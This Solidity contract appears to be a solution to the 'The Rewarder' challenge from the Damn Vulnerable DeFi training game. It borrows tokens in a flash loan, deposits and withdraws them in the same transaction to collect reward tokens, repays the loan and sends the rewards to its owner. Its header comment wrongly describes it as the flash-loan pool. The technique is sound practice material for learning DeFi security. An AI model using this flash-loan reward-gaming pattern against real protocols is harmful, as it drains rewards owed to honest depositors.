// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewarderAttacker {
    FlashLoanerPool private flashLoanPool;
    TheRewarderPool private rewardPool;
    address owner;

    constructor(address _flashLoanPool, address _rewarderPool) {
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewardPool = TheRewarderPool(_rewarderPool);
        owner = msg.sender;
    }

    function attack(uint256 amount) public {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanPool));
        flashLoanPool.liquidityToken().approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        flashLoanPool.liquidityToken().transfer(address(flashLoanPool), amount);
        rewardPool.rewardToken().transfer(
            owner,
            rewardPool.rewardToken().balanceOf(address(this))
        );
    }
}
